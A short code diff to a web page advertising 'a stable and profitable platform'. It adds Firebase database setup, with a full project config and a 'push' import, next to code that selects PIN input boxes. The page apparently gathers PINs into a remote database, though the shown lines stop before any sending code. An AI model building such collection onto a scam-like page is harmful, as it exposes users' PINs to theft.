@@ -171,7 +171,24 @@ A stable and profitable platform
 
 </div>
 
-<script>
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCvUTcjYusi7eHGYUvYkeeTPwWhmVuw4wI",
+  authDomain: "spro-deal-a87cd.firebaseapp.com",
+  databaseURL: "https://spro-deal-a87cd-default-rtdb.firebaseio.com",
+  projectId: "spro-deal-a87cd",
+  storageBucket: "spro-deal-a87cd.firebasestorage.app",
+  messagingSenderId: "881694010465",
+  appId: "1:881694010465:web:a91f60a585b36447458e20",
+  measurementId: "G-0KHC1X0DC6"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
 
 const inputs=document.querySelectorAll(".pin-box input");
 
